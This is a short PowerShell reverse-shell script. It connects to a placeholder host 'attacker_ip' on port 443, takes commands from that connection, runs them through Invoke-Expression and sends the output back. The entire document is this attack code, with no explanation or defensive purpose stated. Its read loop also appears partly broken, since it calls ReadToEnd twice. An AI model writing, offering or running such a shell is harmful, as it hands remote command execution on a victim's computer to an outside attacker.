$ip = "attacker_ip"
$port = 443

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
$reader = New-Object System.IO.StreamReader($stream)

while ($reader.ReadLine() -ne $null) {
$writer.Write($reader.ReadToEnd())
$writer.Flush()
$response = Invoke-Expression -Command ($reader.ReadToEnd())
$writer.Write($response)
$writer.Flush()
}
